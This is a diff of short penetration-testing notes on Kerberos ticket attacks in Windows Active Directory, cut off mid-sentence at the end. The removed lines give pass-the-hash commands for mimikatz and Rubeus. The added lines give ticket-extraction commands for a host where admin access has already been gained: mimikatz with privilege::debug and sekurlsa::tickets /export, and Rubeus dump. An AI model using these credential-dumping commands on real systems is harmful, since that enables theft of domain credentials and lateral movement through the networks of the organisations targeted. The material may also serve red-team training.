@@ -1,10 +1,18 @@
-Now we will see how to pass the ticket rather than hash from Windows system. We need TGT (Ticket granting ticket) or TGS (Service Ticket) 
+Scenario:- After getting any low level user machine and have Local system administrators access, we can use Mimikatz or Rubes to get the AD tickets (TGT or TGS)  
 
-Option 1) mimikatz :- Once we have the ticket, run the below commands to pass the tickets and get the access in command promt. 
-          mimikatz.exe
+Let's see the below steps to extract the kerberos tickets from Windows system (from the system which we got admin access) 
+
+Option 1) Extract the tickets using Mimikatz 
+          c:\tools> mimikatz.exe
           mimikatz # privilege::debug
-          mimikatz # sekurlsa::pth /domain:<domain> /user:<username> /ntlm:<Hash>
+          mimikatz # sekurlsa::tickets /export
+          mimikatz # exit
+          Bye!
+          c:\tools> dir *.kirbi {Saved the hash in the file}
 
+Option 2) Extract the tickets using Rubeus
+          c:\tools> Rubeus.exe dump /nowrap
 
-Option 2) Rubeus :- Once we have the ticket, run the below commands to pass the tickets and get the access in command promt. 
-          #Rubeus.exe  asktgt /domain:<Domain> /user:<username> /aes256:<Hash of aes 256> /nowrap
+====================================================================================================================================
+
+We can use the 
